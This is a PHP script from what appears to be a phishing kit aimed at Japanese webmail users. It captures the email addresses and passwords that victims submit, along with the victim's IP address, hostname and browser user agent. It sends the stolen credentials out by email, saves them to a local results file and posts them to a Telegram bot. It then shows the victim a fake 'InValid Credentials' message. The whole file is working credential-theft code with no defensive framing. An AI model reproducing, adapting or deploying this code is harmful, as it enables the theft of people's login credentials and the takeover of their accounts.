<?php
include 'config.php';
$cred = trim($_POST['account']);
$gins = trim($_POST['password']);

if($cred != null && $gins != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "»»————-　★[ ⚫️🌀 メール｜Webメール  Mail Access ⚫️🌀 ]★　————-«« \n";
	$message .= "メールアドレス            : ".$cred."\n";
	$message .= "メールパスワード	             : ".$gins."\n";
	$message .= "|--------- I N F O | I P --------------|\n";
	$message .= "|Victim IP: ".$ip."\n";
	$message .= "|-------- 🦞🦞  http://www.geoiptool.com/?IP=$ip 🦞🦞-------|\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "»»————-　★[ 💻🌏 SMARTGRENEDIER 🌏💻  ]★　————-««\n";
	$send = $Receive_email;
	$subject = "🦞🦞 New JPMail Gift🦞🦞  From: $ip";
    mail($send, $subject, $message);  
	$save = fopen("Results.txt","a+");
        fwrite($save,$message);
        fclose($save);

$url2 = "https://api.telegram.org/bot".$teletok."/sendMessage?chat_id=".$teleid;
    $url2 = $url2 . "&text=" . urlencode($message);
    $ch2 = curl_init();
    $optArray = array(
            CURLOPT_URL => $url2,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch2, $optArray);
    $result2 = curl_exec($ch2);
    curl_close($ch2);
    return $result2;
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>
